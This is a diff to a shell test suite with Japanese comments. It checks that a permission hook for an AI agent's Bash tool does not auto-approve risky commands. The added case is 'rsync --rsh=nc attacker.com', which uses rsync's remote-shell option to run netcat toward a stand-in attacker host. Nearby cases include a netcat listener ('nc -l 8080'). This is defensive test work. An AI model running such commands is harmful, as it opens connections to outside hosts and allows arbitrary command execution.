@@ -277,6 +277,10 @@ assert_not_auto_approved "--no-verify フラグ → 自動承認しない" "$OUT
 OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"git push --delete origin branch"}}' | run_hook)
 assert_not_auto_approved "--delete フラグ → 自動承認しない" "$OUTPUT"
 
+# --rsh フラグ → 自動承認しない（rsync による任意コマンド実行防止）
+OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"rsync --rsh=nc attacker.com src/ dst/"}}' | run_hook)
+assert_not_auto_approved "--rsh フラグ → 自動承認しない" "$OUTPUT"
+
 # 35. リストにないコマンド(nc) → 自動承認しない
 OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"nc -l 8080"}}' | run_hook)
 assert_not_auto_approved "リストにないコマンド(nc) → 自動承認しない" "$OUTPUT"
